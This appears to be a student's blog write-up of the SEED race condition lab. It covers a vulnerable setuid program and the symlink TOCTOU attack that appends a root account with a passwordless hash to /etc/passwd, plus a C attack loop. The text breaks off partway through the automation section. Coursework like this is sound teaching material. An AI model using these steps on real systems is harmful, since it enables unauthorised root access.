

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.jpg">
  <link rel="icon" href="/img/favicon.jpg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Wu Yuhan">
  <meta name="keywords" content="">
  
    <meta name="description" content="软件安全课程实验五Race Condition Vulnerability Lab">
<meta property="og:type" content="article">
<meta property="og:title" content="Race Condition Vulnerability Lab">
<meta property="og:url" content="http://yuhan2001.github.io/2021/12/11/Race_Condition_Vulnerability_Lab/index.html">
<meta property="og:site_name" content="Yuhan&#39;s blog">
<meta property="og:description" content="软件安全课程实验五Race Condition Vulnerability Lab">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211190522204.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211191832955.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211193423680.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211193557954.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211194656855.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211194743280.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211202246049.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211202524702.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211202536770.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211202721182.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211202833736.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211204402355.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211204607627.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211204649657.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211204814280.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211204938452.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211204959569.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211211310806.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211211414604.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211213612436.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211213724915.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211213859715.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211214035163.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211214522375.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211214611103.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211214644501.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211214706604.png">
<meta property="article:published_time" content="2021-12-10T16:00:00.000Z">
<meta property="article:modified_time" content="2021-12-12T04:58:08.955Z">
<meta property="article:author" content="Wu Yuhan">
<meta property="article:tag" content="软件安全实验">
<meta property="article:tag" content="计算机安全导论">
<meta property="article:tag" content="SeedUbuntu">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://yuhan2001.github.io/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211190522204.png">
  
  
  <title>Race Condition Vulnerability Lab - Yuhan&#39;s blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://lib.baomitu.com/highlight.js/10.7.3/styles/vs2015.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
  


<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"yuhan2001.github.io","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":"6da93a2e5d7f160e0f40b273ddbbddac","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 6.2.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Yuhan&#39;s Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/3.jpeg') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="Race Condition Vulnerability Lab">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2021-12-11 00:00" pubdate>
        2021年12月11日 凌晨
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      7.7k 字
    </span>
  

  
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      65 分钟
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">Race Condition Vulnerability Lab</h1>
            
            <div class="markdown-body">
              <h1 id="Race-Condition-Vulnerability-Lab"><a href="#Race-Condition-Vulnerability-Lab" class="headerlink" title="Race_Condition_Vulnerability_Lab"></a>Race_Condition_Vulnerability_Lab</h1><h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1 概述"></a>1 概述</h2><p>​        本实验的学习目标是让学生通过将他们从课堂上学到的关于漏洞的知识付诸行动，获得关于竞争条件漏洞的第一手经验。当多个进程同时访问和操作相同的数据时，就会出现竞争条件，并且执行的结果取决于访问发生的特定顺序。 如果特权程序存在竞争条件漏洞，攻击者可以运行一个并行进程来与特权程序“竞争”，意图改变程序的行为。<br>​        在这个实验室中，学生将获得一个具有竞争条件漏洞的程序； 他们的任务是开发一个利用漏洞并获得root权限的方案。 除了攻击之外，还将指导学生了解几种可用于对抗竞争条件攻击的保护方案。<br>​        学生需要评估这些计划是否有效并解释原因。 本实验涵盖以下主题：</p>
<ul>
<li>竞争条件漏洞</li>
<li>粘滞符号链接保护</li>
<li>最小特权原则</li>
</ul>
<h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p> SEED Ubuntu 20.04 </p>
<h2 id="2-环境配置"><a href="#2-环境配置" class="headerlink" title="2 环境配置"></a>2 环境配置</h2><h3 id="2-1-关闭对策"><a href="#2-1-关闭对策" class="headerlink" title="2.1 关闭对策"></a>2.1 关闭对策</h3><p>Ubuntu 具有针对竞争条件攻击的内置保护。 该方案通过限制谁可以遵循符号链接来工作。 根据文档，“如果跟随者和目录所有者都与符号链接所有者不匹配，则全局可写的粘滞目录（例如 <code>/tmp</code>）中的符号链接无法被跟随 。”  </p>
<p>Ubuntu 20.04 引入了另一种安全机制，可防止 root 写入 <code>/tmp</code> 中属于其他人的文件。 在本实验中，我们需要禁用这些保护。 您可以使用以下命令来实现：</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo sysctl -w fs.protected_symlinks=0</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo sysctl fs.protected_regular=0</span><br></code></pre></div></td></tr></table></figure>
<h4 id="实验操作"><a href="#实验操作" class="headerlink" title="实验操作"></a>实验操作</h4><p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211190522204.png" srcset="/img/loading.gif" lazyload alt="image-20211211190522204"></p>
<h3 id="2-2-一个易受攻击的程序"><a href="#2-2-一个易受攻击的程序" class="headerlink" title="2.2 一个易受攻击的程序"></a>2.2 一个易受攻击的程序</h3><p>下面的程序是一个看似无害的程序。 它包含一个竞争条件漏洞。</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//vulp.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> * fn = <span class="hljs-string">&quot;/tmp/XYZ&quot;</span>;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">60</span>];<br>    FILE *fp;<br>    <span class="hljs-comment">/* get user input */</span><br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%50s&quot;</span>, buffer )<br>    <span class="hljs-keyword">if</span>(!access(fn, W_OK))&#123; ① <br>    fp = fopen(fn, <span class="hljs-string">&quot;a+&quot;</span>);  ②<br>    fwrite(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>), <span class="hljs-number">1</span>, fp);<br>    fwrite(buffer, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>), <span class="hljs-built_in">strlen</span>(buffer), fp);<br>    fclose(fp);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No permission \n&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure>
<ul>
<li>上面的程序是一个root拥有的Set-UID程序； 它将用户输入的字符串附加到临时文件<code>/tmp/XYZ</code>的末尾。 由于代码以 root 权限运行，即其有效用户 ID 为0，因此它可以覆盖任何文件。</li>
<li>为防止自己不小心覆盖别人的文件，程序首先检查真实用户ID是否具有<code>/tmp/XYZ</code>文件的访问权限；这就是第 ① 行中 <code>access()</code> 调用的目的。 如果真实用户 ID 确实具有权限，则程序在第 ② 行打开文件并将用户输入附加到文件中。</li>
<li>乍一看该程序似乎没有任何问题。 但是这个程序存在竞争条件漏洞：由于检查（<code>access</code>）和使用（<code>fopen</code>）之间的时间窗口，存在<code>access()</code>使用的文件与<code>fopen()</code>使用的文件不同的可能性，即使它们具有相同的文件名<code>/tmp/XYZ</code>. 如果恶意攻击者可以在时间窗口内以某种方式使<code>/tmp/XYZ</code>成为指向受保护文件（例如 <code>/etc/passwd</code>）的符号链接，则攻击者可以将用户输入附加到 <code>/etc/passwd</code>，从而获得root权限。 易受攻击的程序以<code>root</code>权限运行，因此它可以覆盖任何文件。</li>
</ul>
<h4 id="设置-Set-UID-程序"><a href="#设置-Set-UID-程序" class="headerlink" title="设置 Set-UID 程序"></a>设置 Set-UID 程序</h4><p>我们首先编译上面的代码，把它的二进制文件变成一个由root拥有的Set-UID程序。 以下命令可实现此目标：</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">gcc vulp.c -o vulp</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">chown</span> root vulp</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">chmod</span> 4755 vulp</span><br></code></pre></div></td></tr></table></figure>
<h5 id="实验操作-1"><a href="#实验操作-1" class="headerlink" title="实验操作"></a>实验操作</h5><p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211191832955.png" srcset="/img/loading.gif" lazyload alt="image-20211211191832955"></p>
<h2 id="3-任务1：选择我们的目标"><a href="#3-任务1：选择我们的目标" class="headerlink" title="3 任务1：选择我们的目标"></a>3 任务1：选择我们的目标</h2><p>​        我们想利用程序中的竞争条件漏洞。 我们选择以普通用户不可写的密码文件<code>/etc/passwd</code>为目标。 通过利用该漏洞，我们希望在密码文件中添加一条记录，目的是创建一个具有 root 权限的新用户帐户。<br>在密码文件中，每个用户都有一个条目，该条目由七个以冒号 (:) 分隔的字段组成。 下面列出了 root 用户的条目。</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">root:x:0:0:root:/root:/bin/bash<br></code></pre></div></td></tr></table></figure>
<ul>
<li>对于 root 用户，第三个字段（用户 ID 字段）的值为零。 即，当root用户登录时，其进程的用户ID设置为零，赋予该进程root权限。 基本上，root 帐户的权力不来自其名称，而是来自用户 ID 字段。 如果我们想创建一个具有 root 权限的帐户，我们只需要在这个字段中输入一个零。</li>
<li>每个条目还包含一个密码字段，这是第二个字段。 在上面的示例中，该字段设置为“x”，表示密码存储在另一个名为<code>/etc/shadow</code>（影子文件）的文件中。</li>
<li>如果我们按照这个例子，我们必须使用竞争条件漏洞来修改密码和影子文件，这不是很难做到。 但是，有一个更简单的解决方案。 我们可以简单地将密码放在那里，而不是将“x”放在密码文件中，这样操作系统就不会从影子文件中查找密码。</li>
<li>密码字段不保存实际密码； 它保存密码的单向哈希值。</li>
<li>要为给定的密码获取这样的值，我们可以使用<code>adduser</code>命令在我们自己的系统中添加一个新用户，然后从影子文件中获取我们密码的单向哈希值。 或者我们可以简单地从种子用户的条目中复制值，因为我们知道它的密码是 <code>dees</code>。 有趣的是，Ubuntu live CD 中有一个用于无密码帐户的魔法值，该魔法值是<code>U6aMy0wojraho</code>（第 6 个字符为零，不是字母 O）。 如果我们将此值放在用户条目的密码字段中，我们只需要在提示输入密码时按回车键。</li>
</ul>
<h3 id="小任务"><a href="#小任务" class="headerlink" title="小任务"></a>小任务</h3><ul>
<li><p>为了验证魔法密码是否有效，我们手动（作为超级用户）将以下条目添加到<code>/etc/passwd</code>文件的末尾。 请查看是否可以无需输入密码登录测试帐户，且是否拥有root权限。</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">test:U6aMy0wojraho:0:0:test:/root:/bin/bash<br></code></pre></div></td></tr></table></figure>
</li>
<li><p>完成此任务后，请从密码文件中删除此条目。 在接下来的任务中，我们需要以普通用户的身份来实现这个目标。 显然，我们不允许直接对密码文件执行此操作，但我们可以利用特权程序中的竞争条件来实现相同漏洞的目标。</p>
</li>
</ul>
<h3 id="警告"><a href="#警告" class="headerlink" title="警告"></a>警告</h3><p>过去，一些学生在攻击过程中不小心清空了<code>/etc/passwd</code>文件（这可能是由操作系统内核内部的一些竞争条件问题引起的）。 如果您丢失了密码文件，您将无法再次登录。 为避免此问题，请复制原始密码文件或拍摄 VM 快照。 这样，您就可以轻松地从事故中恢复过来。</p>
<h3 id="实验操作-2"><a href="#实验操作-2" class="headerlink" title="实验操作"></a>实验操作</h3><p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211193423680.png" srcset="/img/loading.gif" lazyload alt="image-20211211193423680"></p>
<p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211193557954.png" srcset="/img/loading.gif" lazyload alt="image-20211211193557954"></p>
<h2 id="4-任务2：发起竞争条件攻击"><a href="#4-任务2：发起竞争条件攻击" class="headerlink" title="4 任务2：发起竞争条件攻击"></a>4 任务2：发起竞争条件攻击</h2><p>​        此任务的目标是利用前面列出的易受攻击的 Set-UID 程序中的竞争条件漏洞。 最终目的是获得root权限。 攻击最关键的一步，使<code>/tmp/XYZ</code>指向密码文件，必须发生在检查和使用之间的窗口内； 即在易受攻击的程序中的<code>access</code>和<code>fopen</code>调用之间。</p>
<h3 id="4-1-任务-2-A：模拟慢速机器"><a href="#4-1-任务-2-A：模拟慢速机器" class="headerlink" title="4.1 任务 2.A：模拟慢速机器"></a>4.1 任务 2.A：模拟慢速机器</h3><p>​        让我们假设机器很慢，在 <code>access()</code>和<code>fopen()</code>调用之间有 10 秒的时间窗口。 为了模拟这一点，我们在它们之间添加了一个 <code>sleep(10)</code>。 该程序将如下所示：</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (!access(fn, W_OK)) &#123;<br>    sleep(<span class="hljs-number">10</span>);<br>    fp = fopen(fn, <span class="hljs-string">&quot;a+&quot;</span>);<br>    ...<br></code></pre></div></td></tr></table></figure>
<ul>
<li>有了这个添加，<code>vulp</code> 程序（重新编译时）将暂停并将控制权交给操作系统 10 秒钟。 你的工作是手动做一些事情使程序在 10 秒后恢复时，程序可以帮助你向系统添加一个 root 帐户。 请演示您将如何实现这一目标。</li>
</ul>
<p>​        您将无法修改文件名 <code>/tmp/XYZ</code>，因为它在程序中是硬编码的，但您可以使用符号链接来更改此名称的含义。 例如，您可以将<code>/tmp/XYZ</code> 设为指向<code>/dev/null</code> 文件的符号链接。 当您写入<code>/tmp/XYZ</code> 时，实际内容将写入 <code>/dev/null</code>。 请参见以下示例（“f”选项表示如果链接存在，则先删除旧链接）：</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">ln</span> -sf /dev/null /tmp/XYZ</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">ls</span> -ld /tmp/XYZ</span><br>lrwxrwxrwx 1 seed seed 9 Dec 25 22:20 /tmp/XYZ -&gt; /dev/null<br></code></pre></div></td></tr></table></figure>
<h4 id="实验操作-3"><a href="#实验操作-3" class="headerlink" title="实验操作"></a>实验操作</h4><ol>
<li><p>更改<code>vulp.c</code>，重新编译，设为root所有的<code>setuid</code>程序。</p>
<p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211194656855.png" srcset="/img/loading.gif" lazyload alt="image-20211211194656855"></p>
<p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211194743280.png" srcset="/img/loading.gif" lazyload alt="image-20211211194743280"></p>
</li>
<li><p>将<code>/tmp/XYZ</code>设为指向<code>/dev/null</code> 文件（权限位为<code>rw-rw-rw-</code>）的符号链接。</p>
<p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211202246049.png" srcset="/img/loading.gif" lazyload alt="image-20211211202246049"></p>
</li>
<li><p>运行<code>vulp</code>。用户输入为我们要写入<code>/etc/passwd</code>的字符串：<code>test:U6aMy0wojraho:0:0:test:/root:/bin/bash</code>，回车结束输入</p>
<p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211202524702.png" srcset="/img/loading.gif" lazyload alt="image-20211211202524702"></p>
</li>
<li><p>在提供输入后的十秒内，执行命令<code>ln -sf /etc/passwd /tmp/XYZ</code>，使<code>/tmp/XYZ</code>指向密码文件。</p>
<p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211202536770.png" srcset="/img/loading.gif" lazyload alt="image-20211211202536770"></p>
</li>
<li><p>打开<code>/etc/passwd</code>，可以看到多了一行我们的输入。</p>
<p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211202721182.png" srcset="/img/loading.gif" lazyload alt="image-20211211202721182"></p>
</li>
<li><p>同样，切换用户至<code>test</code>，无需密码即可获得root权限。</p>
<p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211202833736.png" srcset="/img/loading.gif" lazyload alt="image-20211211202833736"></p>
</li>
</ol>
<h3 id="4-2-任务-2-B：真正的攻击"><a href="#4-2-任务-2-B：真正的攻击" class="headerlink" title="4.2 任务 2.B：真正的攻击"></a>4.2 任务 2.B：真正的攻击</h3><p>​        在之前的任务中，我们通过要求易受攻击的程序放慢速度来“欺骗”，这样我们就可以发起攻击。 这绝对不是真正的攻击。</p>
<p>​        在这个任务中，我们将发起真正的攻击。 在做任务前，确保从 <code>vulp</code> 程序中删除了 sleep() 语句。</p>
<p>​        竞争条件攻击的典型策略是与目标程序并行运行攻击程序，希望能够在那个时间窗口内完成关键步骤。 不幸的是，完美的时机很难实现，所以攻击的成功只是概率。 如果窗口很小，攻击成功的概率可能很低，但我们可以多次运行攻击。 我们只需要袭击到一次竞争条件窗口。</p>
<h3 id="编写攻击程序"><a href="#编写攻击程序" class="headerlink" title="编写攻击程序"></a>编写攻击程序</h3><p>​        在模拟攻击中，我们使用<code>ln-s</code>命令创建/更改符号链接。现在我们需要在一个程序中完成它。我们可以在C中使用<code>symlink()</code>来创建符号链接。由于Linux不允许在链接已经存在的情况下创建链接，因此我们需要先删除旧链接。下面的C代码片段显示了如何删除链接，然后使<code>/tmp/XYZ</code>指向<code>/etc/passwd</code>。请编写您的攻击程序。</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">unlink(<span class="hljs-string">&quot;/tmp/XYZ&quot;</span>);<br>symlink(<span class="hljs-string">&quot;/etc/passwd&quot;</span>,<span class="hljs-string">&quot;/tmp/XYZ&quot;</span>);<br></code></pre></div></td></tr></table></figure>
<h4 id="实验操作-4"><a href="#实验操作-4" class="headerlink" title="实验操作"></a>实验操作</h4><p>攻击程序<code>attack_process.c</code>如下：</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//attack_process.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br> <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br>        unlink(<span class="hljs-string">&quot;/tmp/XYZ&quot;</span>);<br>        symlink(<span class="hljs-string">&quot;/dev/null&quot;</span>,<span class="hljs-string">&quot;/tmp/XYZ&quot;</span>);<br>        usleep(<span class="hljs-number">1000</span>);<br> <br>        unlink(<span class="hljs-string">&quot;/tmp/XYZ&quot;</span>);<br>        symlink(<span class="hljs-string">&quot;/etc/passwd&quot;</span>,<span class="hljs-string">&quot;/tmp/XYZ&quot;</span>);<br>        usleep(<span class="hljs-number">1000</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<h3 id="运行易受攻击的程序并监视结果"><a href="#运行易受攻击的程序并监视结果" class="headerlink" title="运行易受攻击的程序并监视结果"></a>运行易受攻击的程序并监视结果</h3><p>​        由于我们需要多次运行易受攻击的程序，因此我们将编写一个程序来自动化此过程。为了避免手动向易受攻击的程序<code>vulp</code>键入输入，我们可以使用输入重定向。也就是说，我们将输入保存在一个文件中，并要求<code>vulp</code>使用<code>vulp&lt;inputFile</code>从该文件获取输入。我们也可以使用管道（稍后将给出一个示例）。<br>​        我们的攻击可能需要一段时间才能成功修改密码文件，因此我们需要一种方法来自动检测攻击是否成功。有很多方法可以做到这一点；一种简单的方法是监视文件的时间戳。下面的shell脚本运行<code>ls-l</code>命令，该命令输出有关文件的多条信息，包括上次修改的时间。通过将命令的输出与之前生成的输出进行比较，我们可以判断文件是否已被修改。<br>​        下面的shell脚本使用echo命令（通过管道）提供的输入，在循环中运行易受攻击的程序（<code>vulp</code>）。您需要决定实际输入的内容。如果攻击成功，即修改<code>passwd</code>，shell脚本将停止。你需要有点耐心。通常，你应该能够在5分钟内成功。</p>
